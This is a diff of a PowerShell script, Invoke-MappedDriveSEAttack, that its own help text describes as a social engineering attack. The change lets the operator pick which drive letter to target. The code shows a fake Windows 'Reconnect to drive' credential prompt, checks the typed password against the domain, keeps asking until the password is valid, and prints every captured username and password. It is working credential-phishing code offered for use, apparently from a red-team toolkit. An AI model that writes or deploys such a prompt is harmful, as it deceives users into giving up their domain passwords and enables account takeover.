@@ -1,6 +1,12 @@
 #requires -Version 2
 Function Invoke-MappedDriveSEAttack
 {
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory = $false,Position = 1)]
+        [string]$Drive
+
+    )
     <#
             # All credit to the original author(s): Ryan Watson (Watson0x90)
             #
@@ -36,9 +42,9 @@ Function Invoke-MappedDriveSEAttack
             .Description Social engineering attack to propmtping users re-enter credentials for a mapped drive on their computer.
 
             .Example
-            Invoke-MappedDriveSEAttack
+            Invoke-MappedDriveSEAttack -Drive R
 	
-            Invoke-MappedDriveSEAttack | Out-File C:\users\public\libraries\tmp.library-ms
+            Invoke-MappedDriveSEAttack -Drive T | Out-File C:\users\public\libraries\tmp.library-ms
     #>
 
     $ErrorActionPreference = 'SilentlyContinue'
@@ -85,66 +91,56 @@ Function Invoke-MappedDriveSEAttack
         }
     }
 
-    $AvailableDrives = Get-PSDrive -PSProvider FileSystem | Where-Object -FilterScript {
-        $_.Used -gt 1kb -and $_.Name -ne 'C'
-    }
-	
-
-    if($AvailableDrives -ne $null)
+          
+	$Drive = $Drive + ':\'		
+    $ValidCreds = $false
+    $credentials = @()
+    Do
     {
-        $Drive = $AvailableDrives |
-        Select-Object -Property Root -ExpandProperty Root |
-        Get-Random -Count 1
-			
-        $ValidCreds = $false
-        $credentials = @()
-        Do
-        {
-            #$testCred = Steal-Credential -driveLetter $Drive
+        #$testCred = Steal-Credential -driveLetter $Drive
 				
-            $cred = $host.ui.promptforcredential('Reconnect to '+$Drive,'Windows is unable to access '+$Drive+'                                    Authtication Required. ',$env:UserDomain + '\' + $env:UserName,$env:UserDomain)
+        $cred = $host.ui.promptforcredential('Reconnect to '+$Drive,'Windows is unable to access '+$Drive+'                                    Authtication Required. ',$env:UserDomain + '\' + $env:UserName,$env:UserDomain)
 				
-            $UserDefDomain = $cred.GetNetworkCredential().Domain
-            $username = $cred.GetNetworkCredential().UserName
-            $password = $cred.GetNetworkCredential().Password
-            $CurrentDomain = $env:UserDomain
+        $UserDefDomain = $cred.GetNetworkCredential().Domain
+        $username = $cred.GetNetworkCredential().UserName
+        $password = $cred.GetNetworkCredential().Password
+        $CurrentDomain = $env:UserDomain
 				
                 
-            $isValid = Test-Credentials -username $username -password $password -domain $UserDefDomain
+        $isValid = Test-Credentials -username $username -password $password -domain $UserDefDomain
                 
 								
-            if($isValid -eq $false)
-            {
-                $credentialsTemp = New-Object -TypeName psobject -Property @{
-                    Domain   = $CurrentDomain
-                    Username = $username
-                    Password = $password
-                    Valid    = $false
-                }
-                $credentials += $credentialsTemp
-                $retry = Error-BadCredentialsPrompt
-                if($retry -eq 2)
-                {
-                    '## User exited erorr prompt without retry ##'
-                    break
-                }
+        if($isValid -eq $false)
+        {
+            $credentialsTemp = New-Object -TypeName psobject -Property @{
+                Domain   = $CurrentDomain
+                Username = $username
+                Password = $password
+                Valid    = $false
             }
-            else
+            $credentials += $credentialsTemp
+            $retry = Error-BadCredentialsPrompt
+            if($retry -eq 2)
             {
-                $credentialsTemp = New-Object -TypeName psobject -Property @{
-                    Domain   = $CurrentDomain
-                    Username = $username
-                    Password = $password
-                    Valid    = $true
-                }
-                $credentials += $credentialsTemp
-                $ValidCreds = $true
+                '## User exited erorr prompt without retry ##'
+                break
             }
         }
-        While($ValidCreds -eq $false)
-        '##Credentials##'
-        $credentials |
-        Select-Object -Property Domain, Username, Password, Valid |
-        Format-Table -AutoSize
+        else
+        {
+            $credentialsTemp = New-Object -TypeName psobject -Property @{
+                Domain   = $CurrentDomain
+                Username = $username
+                Password = $password
+                Valid    = $true
+            }
+            $credentials += $credentialsTemp
+            $ValidCreds = $true
+        }
     }
+    While($ValidCreds -eq $false)
+    '##Credentials##'
+    $credentials |
+    Select-Object -Property Domain, Username, Password, Valid |
+    Format-Table -AutoSize
 }
